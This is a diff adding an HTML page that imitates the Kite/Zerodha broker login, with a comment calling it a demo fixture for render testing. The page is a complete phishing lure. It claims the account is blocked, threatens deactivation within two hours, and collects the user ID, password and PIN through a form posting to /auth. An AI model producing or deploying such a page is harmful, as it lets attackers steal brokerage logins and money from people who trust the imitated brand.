@@ -1,0 +1,29 @@
+<!doctype html>
+<!-- DEMO FIXTURE: fake broker (Kite/Zerodha-style) login for render testing. Not affiliated. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Kite - Zerodha | Login</title>
+  <style>
+    body { font-family: "Segoe UI", Arial, sans-serif; background:#fff; color:#31353b; }
+    .wrap { max-width:360px; margin:70px auto; text-align:center; }
+    .logo { color:#387ed1; font-size:26px; font-weight:700; }
+    input { width:100%; padding:12px; margin-top:12px; border:1px solid #e0e0e0; border-radius:4px; box-sizing:border-box; }
+    button { width:100%; margin-top:16px; background:#387ed1; color:#fff; border:0; padding:12px; border-radius:4px; cursor:pointer; }
+    .note { color:#f44; font-size:12px; margin-top:10px; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="logo">✦ kite</div>
+    <p>Your account is temporarily blocked. Re-login to reactivate.</p>
+    <form action="/auth" method="post">
+      <input type="text" name="userid" placeholder="User ID" />
+      <input type="password" name="password" placeholder="Password" />
+      <input type="text" name="pin" placeholder="PIN" />
+      <button type="submit">Reactivate account</button>
+    </form>
+    <div class="note">Failure to login in 2 hours will deactivate your account.</div>
+  </div>
+</body>
+</html>
